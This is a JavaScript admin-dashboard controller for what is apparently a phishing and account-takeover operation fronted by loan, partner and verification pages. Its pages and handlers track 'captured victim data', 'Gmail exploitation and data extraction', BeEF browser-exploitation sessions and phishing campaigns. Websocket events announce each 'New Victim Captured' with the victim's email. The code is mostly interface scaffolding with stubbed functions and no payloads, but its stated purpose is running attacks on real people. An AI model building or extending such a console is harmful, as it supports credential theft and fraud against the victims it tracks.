/**
 * Admin Interface Main Controller
 * Handles routing, navigation, and page management
 */

class AdminInterface {
    static currentPage = 'dashboard';
    static realtimeDashboard = null;

    static init() {
        // Check if user is authenticated
        if (!this.isAuthenticated()) {
            this.redirectToLogin();
            return;
        }

        this.setupNavigation();
        this.loadPage('dashboard');
        this.initializeWebSocket();
        this.startPeriodicUpdates();
        this.setupSessionManagement();
    }

    static isAuthenticated() {
        const token = AdminAPIClient.getAuthToken();
        return token !== null && token !== undefined && token !== '';
    }

    static redirectToLogin() {
        window.location.href = 'index.html';
    }

    static setupSessionManagement() {
        // Check session validity every 5 minutes
        setInterval(() => {
            this.checkSessionValidity();
        }, 5 * 60 * 1000);

        // Handle page visibility changes
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && !this.isAuthenticated()) {
                this.redirectToLogin();
            }
        });
    }

    static async checkSessionValidity() {
        try {
            const isConnected = await AdminAPIClient.testConnection();
            if (!isConnected) {
                this.handleSessionExpired();
            }
        } catch (error) {
            console.warn('Session check failed:', error);
        }
    }

    static handleSessionExpired() {
        AdminAPIClient.setAuthToken(null);
        this.showNotification('Session Expired', 'Please login again', 'warning');
        setTimeout(() => {
            this.redirectToLogin();
        }, 2000);
    }

    static setupNavigation() {
        const navLinks = document.querySelectorAll('.nav-link[data-page]');

        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const page = link.getAttribute('data-page');
                this.loadPage(page);

                // Update active state
                navLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
            });
        });
    }

    static async loadPage(page) {
        this.currentPage = page;
        this.showLoading('Loading page...');

        try {
            const content = await this.getPageContent(page);
            document.getElementById('pageContent').innerHTML = content;

            // Update page title and subtitle
            this.updatePageHeader(page);

            // Initialize page-specific functionality
            this.initializePage(page);

        } catch (error) {
            console.error('Error loading page:', error);
            this.showError('Failed to load page: ' + error.message);
        } finally {
            this.hideLoading();
        }
    }

    static async getPageContent(page) {
        const pages = {
            dashboard: this.getDashboardContent(),
            loans: this.getLoansContent(),
            partners: this.getPartnersContent(),
            verifications: this.getVerificationsContent(),
            transactions: this.getTransactionsContent(),
            users: this.getUsersContent(),
            gmail: this.getGmailContent(),
            beef: this.getBeefContent(),
            campaigns: this.getCampaignsContent(),
            victims: this.getVictimsContent(),
            monitoring: this.getMonitoringContent()
        };

        return pages[page] || '<div class="text-center py-5"><h3>Page not found</h3></div>';
    }

    static getDashboardContent() {
        return `
            <div class="container-fluid">
                <!-- Statistics Cards -->
                <div class="row mb-4">
                    <div class="col-xl-3 col-md-6 mb-4">
                        <div class="card stats-card shadow h-100 py-2">
                            <div class="card-body">
                                <div class="row no-gutters align-items-center">
                                    <div class="col mr-2">
                                        <div class="text-xs font-weight-bold text-uppercase mb-1">Total Partners</div>
                                        <div class="h5 mb-0 font-weight-bold" id="totalPartners">0</div>
                                    </div>
                                    <div class="col-auto">
                                        <i class="fas fa-handshake fa-2x text-white-50"></i>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-xl-3 col-md-6 mb-4">
                        <div class="card border-left-success shadow h-100 py-2">
                            <div class="card-body">
                                <div class="row no-gutters align-items-center">
                                    <div class="col mr-2">
                                        <div class="text-xs font-weight-bold text-success text-uppercase mb-1">Active Victims</div>
                                        <div class="h5 mb-0 font-weight-bold text-gray-800" id="activeVictims">0</div>
                                    </div>
                                    <div class="col-auto">
                                        <i class="fas fa-crosshairs fa-2x text-gray-300"></i>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-xl-3 col-md-6 mb-4">
                        <div class="card border-left-info shadow h-100 py-2">
                            <div class="card-body">
                                <div class="row no-gutters align-items-center">
                                    <div class="col mr-2">
                                        <div class="text-xs font-weight-bold text-info text-uppercase mb-1">Gmail Access</div>
                                        <div class="h5 mb-0 font-weight-bold text-gray-800" id="gmailAccess">0</div>
                                    </div>
                                    <div class="col-auto">
                                        <i class="fas fa-envelope fa-2x text-gray-300"></i>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-xl-3 col-md-6 mb-4">
                        <div class="card border-left-warning shadow h-100 py-2">
                            <div class="card-body">
                                <div class="row no-gutters align-items-center">
                                    <div class="col mr-2">
                                        <div class="text-xs font-weight-bold text-warning text-uppercase mb-1">BeEF Sessions</div>
                                        <div class="h5 mb-0 font-weight-bold text-gray-800" id="beefSessions">0</div>
                                    </div>
                                    <div class="col-auto">
                                        <i class="fas fa-bug fa-2x text-gray-300"></i>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Charts Row -->
                <div class="row mb-4">
                    <div class="col-xl-8 col-lg-7">
                        <div class="card shadow">
                            <div class="card-header py-3 d-flex justify-content-between align-items-center">
                                <h6 class="m-0 font-weight-bold text-primary">Activity Timeline</h6>
                                <select class="form-select form-select-sm" id="timelineRange" style="width: auto;">
                                    <option value="7">7 days</option>
                                    <option value="30" selected>30 days</option>
                                    <option value="90">90 days</option>
                                </select>
                            </div>
                            <div class="card-body">
                                <canvas id="activityChart" style="max-height: 300px;"></canvas>
                            </div>
                        </div>
                    </div>

                    <div class="col-xl-4 col-lg-5">
                        <div class="card shadow">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">System Status</h6>
                            </div>
                            <div class="card-body">
                                <div class="mb-3">
                                    <div class="d-flex justify-content-between">
                                        <span>Backend API</span>
                                        <span class="badge bg-success" id="apiStatus">Online</span>
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <div class="d-flex justify-content-between">
                                        <span>WebSocket</span>
                                        <span class="badge bg-success" id="wsStatus">Connected</span>
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <div class="d-flex justify-content-between">
                                        <span>Database</span>
                                        <span class="badge bg-success" id="dbStatus">Connected</span>
                                    </div>
                                </div>
                                <div class="mb-0">
                                    <div class="d-flex justify-content-between">
                                        <span>BeEF Framework</span>
                                        <span class="badge bg-warning" id="beefStatus">Running</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Recent Activity and Quick Actions -->
                <div class="row">
                    <div class="col-lg-6">
                        <div class="card shadow">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Recent Activity</h6>
                            </div>
                            <div class="card-body">
                                <div id="recentActivity">
                                    <div class="text-center py-3">
                                        <div class="spinner-border spinner-border-sm" role="status"></div>
                                        <small class="text-muted d-block">Loading activities...</small>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-lg-6">
                        <div class="card shadow">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Quick Actions</h6>
                            </div>
                            <div class="card-body">
                                <div class="d-grid gap-2">
                                    <button class="btn btn-outline-primary" onclick="quickAction('refresh_victims')">
                                        <i class="fas fa-sync-alt me-2"></i>Refresh Victim Data
                                    </button>
                                    <button class="btn btn-outline-success" onclick="quickAction('export_data')">
                                        <i class="fas fa-download me-2"></i>Export Dashboard Data
                                    </button>
                                    <button class="btn btn-outline-info" onclick="quickAction('system_check')">
                                        <i class="fas fa-stethoscope me-2"></i>System Health Check
                                    </button>
                                    <button class="btn btn-outline-warning" onclick="quickAction('clear_cache')">
                                        <i class="fas fa-broom me-2"></i>Clear Cache
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static getLoansContent() {
        return `
            <div class="container-fluid">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h4 class="mb-1">Loan Management</h4>
                        <p class="text-muted">Manage loan applications and disbursements</p>
                    </div>
                    <button class="btn btn-primary" onclick="showLoanModal()">
                        <i class="fas fa-plus me-2"></i>New Loan Application
                    </button>
                </div>

                <div class="row">
                    <div class="col-12">
                        <div class="card shadow">
                            <div class="card-body">
                                <p class="text-center py-5 text-muted">Loan management interface will be loaded here...</p>
                                <div class="text-center">
                                    <button class="btn btn-primary" onclick="loadLoanInterface()">Load Loan Interface</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static getPartnersContent() {
        return `
            <div class="container-fluid">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h4 class="mb-1">Partner Management</h4>
                        <p class="text-muted">Manage merchant partners and registrations</p>
                    </div>
                </div>

                <div class="row">
                    <div class="col-12">
                        <div class="card shadow">
                            <div class="card-body">
                                <p class="text-center py-5 text-muted">Partner management interface will be loaded here...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static getVerificationsContent() {
        return `
            <div class="container-fluid">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h4 class="mb-1">Verification Management</h4>
                        <p class="text-muted">Handle identity and document verification</p>
                    </div>
                </div>

                <div class="row">
                    <div class="col-12">
                        <div class="card shadow">
                            <div class="card-body">
                                <p class="text-center py-5 text-muted">Verification interface will be loaded here...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static getTransactionsContent() {
        return `
            <div class="container-fluid">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h4 class="mb-1">Transaction Management</h4>
                        <p class="text-muted">Monitor and manage financial transactions</p>
                    </div>
                </div>

                <div class="row">
                    <div class="col-12">
                        <div class="card shadow">
                            <div class="card-body">
                                <p class="text-center py-5 text-muted">Transaction interface will be loaded here...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static getUsersContent() {
        return `
            <div class="container-fluid">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h4 class="mb-1">User Management</h4>
                        <p class="text-muted">Manage system users and permissions</p>
                    </div>
                </div>

                <div class="row">
                    <div class="col-12">
                        <div class="card shadow">
                            <div class="card-body">
                                <p class="text-center py-5 text-muted">User management interface will be loaded here...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static getGmailContent() {
        return `
            <div class="container-fluid">
                <iframe src="gmail_access.html" style="width: 100%; height: calc(100vh - 200px); border: none; border-radius: 8px;"></iframe>
            </div>
        `;
    }

    static getBeefContent() {
        return `
            <div class="container-fluid">
                <iframe src="beef_dashboard.html" style="width: 100%; height: calc(100vh - 200px); border: none; border-radius: 8px;"></iframe>
            </div>
        `;
    }

    static getCampaignsContent() {
        return `
            <div class="container-fluid">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h4 class="mb-1">Campaign Management</h4>
                        <p class="text-muted">Create and manage phishing campaigns</p>
                    </div>
                    <button class="btn btn-success" onclick="createNewCampaign()">
                        <i class="fas fa-plus me-2"></i>New Campaign
                    </button>
                </div>

                <div class="row">
                    <div class="col-12">
                        <div class="card shadow">
                            <div class="card-body">
                                <p class="text-center py-5 text-muted">Campaign management interface will be loaded here...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static getVictimsContent() {
        return `
            <div class="container-fluid">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h4 class="mb-1">Victim Database</h4>
                        <p class="text-muted">Browse and analyze captured victim data</p>
                    </div>
                    <div class="btn-group">
                        <button class="btn btn-outline-primary" onclick="exportVictimData()">
                            <i class="fas fa-download me-2"></i>Export
                        </button>
                        <button class="btn btn-outline-info" onclick="showVictimMap()">
                            <i class="fas fa-map me-2"></i>Map View
                        </button>
                    </div>
                </div>

                <div class="row">
                    <div class="col-12">
                        <div class="card shadow">
                            <div class="card-body">
                                <p class="text-center py-5 text-muted">Victim database interface will be loaded here...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static getMonitoringContent() {
        return `
            <div class="container-fluid">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h4 class="mb-1">System Monitoring</h4>
                        <p class="text-muted">Real-time system performance and analytics</p>
                    </div>
                    <div class="btn-group">
                        <button class="btn btn-outline-success" onclick="generateReport()">
                            <i class="fas fa-chart-bar me-2"></i>Generate Report
                        </button>
                        <button class="btn btn-outline-warning" onclick="showAlerts()">
                            <i class="fas fa-exclamation-triangle me-2"></i>Alerts
                        </button>
                    </div>
                </div>

                <div class="row">
                    <div class="col-12">
                        <div class="card shadow">
                            <div class="card-body">
                                <p class="text-center py-5 text-muted">Monitoring dashboard will be loaded here...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    static updatePageHeader(page) {
        const headers = {
            dashboard: { title: 'Dashboard', subtitle: 'System overview and key metrics' },
            loans: { title: 'Loan Management', subtitle: 'Manage loan applications and disbursements' },
            partners: { title: 'Partner Management', subtitle: 'Manage merchant partners and registrations' },
            verifications: { title: 'Verification Management', subtitle: 'Handle identity and document verification' },
            transactions: { title: 'Transaction Management', subtitle: 'Monitor and manage financial transactions' },
            users: { title: 'User Management', subtitle: 'Manage system users and permissions' },
            gmail: { title: 'Gmail Access', subtitle: 'Manage Gmail exploitation and data extraction' },
            beef: { title: 'BeEF Control', subtitle: 'Browser exploitation framework management' },
            campaigns: { title: 'Campaign Management', subtitle: 'Create and manage phishing campaigns' },
            victims: { title: 'Victim Database', subtitle: 'Browse and analyze captured victim data' },
            monitoring: { title: 'System Monitoring', subtitle: 'Real-time system performance and analytics' }
        };

        const header = headers[page] || { title: 'Page', subtitle: 'Content' };
        document.getElementById('pageTitle').textContent = header.title;
        document.getElementById('pageSubtitle').textContent = header.subtitle;
    }

    static initializePage(page) {
        switch(page) {
            case 'dashboard':
                this.initializeDashboard();
                break;
            case 'loans':
                this.initializeLoans();
                break;
            case 'gmail':
                this.initializeGmail();
                break;
            case 'beef':
                this.initializeBeef();
                break;
            // Add other page initializations as needed
        }
    }

    static initializeDashboard() {
        this.initializeCharts();
        this.loadDashboardData();
    }

    static initializeLoans() {
        // Load loan management interface
        console.log('Initializing loan management...');
    }

    static initializeGmail() {
        // Gmail interface is loaded via iframe
        console.log('Gmail interface loaded...');
    }

    static initializeBeef() {
        // BeEF interface is loaded via iframe
        console.log('BeEF interface loaded...');
    }

    static initializeCharts() {
        const ctx = document.getElementById('activityChart');
        if (!ctx || typeof Chart === 'undefined') return;

        // Sample data - in real implementation, this would come from API
        const data = {
            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
            datasets: [{
                label: 'Victims',
                data: [12, 19, 3, 5, 2, 3, 7],
                borderColor: '#667eea',
                backgroundColor: 'rgba(102, 126, 234, 0.1)',
                fill: true
            }, {
                label: 'Gmail Access',
                data: [2, 3, 1, 1, 1, 0, 2],
                borderColor: '#28a745',
                backgroundColor: 'rgba(40, 167, 69, 0.1)',
                fill: true
            }]
        };

        new Chart(ctx, {
            type: 'line',
            data: data,
            options: {
                responsive: true,
                maintainAspectRatio: false,
                scales: {
                    y: { beginAtZero: true }
                }
            }
        });
    }

    static async loadDashboardData() {
        try {
            // Load statistics using API client
            const stats = await AdminAPIClient.getDashboardStats();
            this.updateStatistics(stats);

            // Load recent activity using API client
            const activityData = await AdminAPIClient.getActivityLogs(1, 10);
            this.updateRecentActivity(activityData.logs || []);

        } catch (error) {
            console.error('Error loading dashboard data:', error);
            AdminAPIClient.handleApiError(error);
        }
    }

    static updateStatistics(stats) {
        document.getElementById('totalPartners').textContent = stats.total_partners || 0;
        document.getElementById('activeVictims').textContent = stats.active_victims || 0;
        document.getElementById('gmailAccess').textContent = stats.gmail_access || 0;
        document.getElementById('beefSessions').textContent = stats.beef_sessions || 0;
    }

    static updateRecentActivity(activities) {
        const container = document.getElementById('recentActivity');
        if (!container) return;

        if (!activities || activities.length === 0) {
            container.innerHTML = '<p class="text-muted text-center">No recent activity</p>';
            return;
        }

        const html = activities.map(activity => `
            <div class="d-flex align-items-center mb-3 p-2 border-bottom">
                <div class="me-3">
                    <i class="fas ${this.getActivityIcon(activity.type)} fa-lg text-primary"></i>
                </div>
                <div class="flex-grow-1">
                    <div class="fw-bold">${activity.title}</div>
                    <small class="text-muted">${activity.description}</small>
                </div>
                <small class="text-muted">${this.formatTime(activity.timestamp)}</small>
            </div>
        `).join('');

        container.innerHTML = html;
    }

    static getActivityIcon(type) {
        const icons = {
            victim: 'fa-user',
            gmail: 'fa-envelope',
            beef: 'fa-bug',
            campaign: 'fa-bullhorn',
            system: 'fa-cog'
        };
        return icons[type] || 'fa-info-circle';
    }

    static formatTime(timestamp) {
        try {
            if (typeof moment !== 'undefined') {
                return moment(timestamp).fromNow();
            }
        } catch (e) {
            console.warn('Moment.js not available, using native Date');
        }
        return new Date(timestamp).toLocaleString();
    }

    static initializeWebSocket() {
        // Initialize real-time dashboard from websocket_client.js
        try {
            if (typeof RealtimeDashboard !== 'undefined') {
                this.realtimeDashboard = new RealtimeDashboard();

                // Set up event handlers for real-time updates
                if (this.realtimeDashboard && this.realtimeDashboard.wsClient) {
                    this.realtimeDashboard.wsClient.on('victim_captured', (data) => {
                        this.handleVictimCaptured(data);
                    });

                    this.realtimeDashboard.wsClient.on('gmail_access_update', (data) => {
                        this.handleGmailUpdate(data);
                    });

                    this.realtimeDashboard.wsClient.on('beef_session_update', (data) => {
                        this.handleBeefUpdate(data);
                    });
                }
            }
        } catch (error) {
            console.warn('WebSocket initialization failed:', error);
        }
    }

    static handleVictimCaptured(data) {
        // Update victim count in real-time
        const victimElement = document.getElementById('activeVictims');
        if (victimElement) {
            const current = parseInt(victimElement.textContent) || 0;
            victimElement.textContent = current + 1;
        }

        this.showNotification('New Victim Captured', `Email: ${data.data.email}`, 'success');
    }

    static handleGmailUpdate(data) {
        const gmailElement = document.getElementById('gmailAccess');
        if (gmailElement) {
            const current = parseInt(gmailElement.textContent) || 0;
            gmailElement.textContent = current + 1;
        }

        this.showNotification('Gmail Access Obtained', `Victim: ${data.data.victim_id}`, 'info');
    }

    static handleBeefUpdate(data) {
        const beefElement = document.getElementById('beefSessions');
        if (beefElement) {
            const current = parseInt(beefElement.textContent) || 0;
            beefElement.textContent = current + 1;
        }

        this.showNotification('BeEF Session Established', `Session: ${data.data.session_id}`, 'warning');
    }

    static showNotification(title, message, type = 'info') {
        try {
            if (typeof toastr !== 'undefined') {
                toastr[type](message, title);
            } else {
                // Fallback notification using browser alert
                console.log(`[${type.toUpperCase()}] ${title}: ${message}`);
                // You could implement a custom toast notification here
            }
        } catch (error) {
            console.warn('Notification failed:', error);
        }
    }

    static startPeriodicUpdates() {
        // Update data every 30 seconds
        setInterval(() => {
            if (this.currentPage === 'dashboard') {
                this.loadDashboardData();
            }
        }, 30000);
    }

    static showLoading(message = 'Loading...') {
        document.getElementById('loadingText').textContent = message;
        document.getElementById('loadingOverlay').classList.remove('d-none');
    }

    static hideLoading() {
        document.getElementById('loadingOverlay').classList.add('d-none');
    }

    static showError(message) {
        this.showNotification('Error', message, 'error');
    }

    static refreshData() {
        this.loadPage(this.currentPage);
    }
}

// Global functions for buttons
function quickAction(action) {
    switch(action) {
        case 'refresh_victims':
            AdminInterface.showNotification('Refreshing', 'Victim data refresh started', 'info');
            break;
        case 'export_data':
            AdminInterface.showNotification('Export', 'Data export started', 'info');
            break;
        case 'system_check':
            AdminInterface.showNotification('System Check', 'Health check completed', 'success');
            break;
        case 'clear_cache':
            AdminInterface.showNotification('Cache', 'Cache cleared successfully', 'success');
            break;
    }
}

function showLoanModal() {
    alert('Loan modal will be implemented');
}

function loadLoanInterface() {
    alert('Loan interface will be loaded');
}

function createNewCampaign() {
    alert('Campaign creation modal will be implemented');
}

function exportVictimData() {
    alert('Victim data export will be implemented');
}

function showVictimMap() {
    alert('Victim map view will be implemented');
}

function generateReport() {
    alert('Report generation will be implemented');
}

function showAlerts() {
    alert('Alerts view will be implemented');
}